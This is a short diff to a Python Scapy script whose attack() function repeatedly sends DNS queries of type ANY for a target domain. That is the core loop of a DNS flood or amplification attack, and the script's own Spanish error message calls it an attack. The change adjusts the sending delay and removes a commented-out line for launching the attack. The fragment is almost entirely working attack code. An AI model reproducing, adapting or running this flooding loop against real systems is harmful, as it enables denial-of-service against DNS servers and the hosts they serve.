@@ -17,11 +17,7 @@ def attack():
                     DNS(rd=1, qd=DNSQR(qname=targetDomain, qtype=255))  # Use 255 for ANY
                 )
                 send(dnsRequest, verbose=False)
-                time.sleep(0.01)
+                time.sleep(0.1)
             time.sleep(1)
     except Exception as e:
         print(f"[ERROR] Error durante el ataque DNS: {e}")
-
-# Example to start attack (uncomment to test)
-# running = True
-# attack()
